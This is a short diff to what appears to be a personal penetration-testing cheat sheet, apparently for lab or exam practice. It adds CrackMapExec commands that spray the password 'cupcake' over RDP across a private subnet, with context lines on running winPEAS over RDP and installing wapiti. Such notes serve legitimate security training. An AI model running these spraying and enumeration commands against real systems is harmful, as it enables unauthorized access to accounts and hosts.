@@ -151,6 +151,11 @@ Passw0rd@1234
 Then use Remmina to rdp to target and download winpeas.
 winPEAS.bat
 -----------------------------------------------------------------------------------------------------------
+#RDP perform password spraying:
+
+cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"
+cme rdp 10.10.1.0/24 -u Maurice -p "cupcake"
+-----------------------------------------------------------------------------------------------------------
 
 -Identify type of security policies is missing to detect and mitigate Cross-Site Scripting XSS & SQL injection attacks:
 apt-get install wapiti
@@ -1549,6 +1554,7 @@ http://snarkles.net/scripts/sneak/sneak.php
 http://utf-8.jp/public/jjencode.html
 
 http://ddecode.com/phpdecoder/
+
 
 
 
